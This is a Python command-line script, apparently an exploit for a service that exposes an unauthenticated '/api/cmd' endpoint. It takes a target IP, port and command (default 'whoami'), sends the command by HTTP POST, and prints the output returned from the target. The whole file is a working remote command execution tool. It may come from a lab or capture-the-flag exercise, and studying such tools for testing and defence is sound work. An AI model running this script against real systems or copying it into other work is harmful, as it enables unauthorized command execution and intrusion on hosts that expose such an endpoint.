#!/usr/bin/env python3

import argparse
import os
import platform
import re
import requests

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

def ExecCmd(baseURL, command):
    message = str()
    success = bool()

    try:
        if not(isinstance(baseURL,str)):
            raise TypeError(f"BaseURL must be a string. Got {type(baseURL)}.")

        if not(isinstance(command,str)):
            raise TypeError(f"Command must be a string. Got {type(command)}.")

        route = "api/cmd"
        targetURL = f"{baseURL}/{route}"
        payload = command.encode()

        resp = requests.post(targetURL, data=payload, timeout=10)
        if resp.status_code != 200:
            raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

        print("="*60)
        print(f"{'Output':^60}")
        print("="*60)
        print(resp.text)
        print("="*60)

        message = "command successfully executed"
        success = True
    except requests.exceptions.ReadTimeout as ex:
        message = "Timeout reached. Command running."
        success = True
    except Exception as ex:
        message = str(ex)
        success = False

    return (success, message)


def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

def main():
    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)
    parser.add_argument("-c","--command", help="Command to execute on target.", type=str, default="whoami", dest="command")

    args = parser.parse_args()

    target = args.target
    port = args.port
    command = args.command

    print("="*60)
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Command: \"{command}\"")
    print("="*60)
    print()

    baseURL = f"http://{target}:{port}"

    success, message = ExecCmd(baseURL, command)

    if success:
        SucMsg(message)
    else:
        ErrMsg(message)
        exit(1)

    return

if __name__ == "__main__":
    main()

